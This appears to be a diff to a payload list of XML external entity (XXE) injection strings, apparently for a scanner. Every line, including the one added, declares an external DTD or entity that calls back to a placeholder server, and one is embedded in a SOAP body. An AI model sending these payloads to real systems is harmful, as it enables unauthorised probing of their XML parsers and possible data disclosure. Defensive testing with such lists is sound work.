@@ -5,4 +5,5 @@
 <?xml version="1.0"?><!DOCTYPE foo SYSTEM "[CLOUD_SERVER_URL]" ><foo>&data;</foo>
 <?xml version="1.0" ?><!DOCTYPE r [ <!ELEMENT r ANY ><!ENTITY sp SYSTEM "[CLOUD_SERVER_URL]"> ]><r>&sp;</r>
 <!DOCTYPE test SYSTEM "[CLOUD_SERVER_URL]">
+<!ENTITY a SYSTEM "[CLOUD_SERVER_URL]" >
 <soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "[CLOUD_SERVER_URL]"> %dtd;]><xxx/>]]></foo></soap:Body>
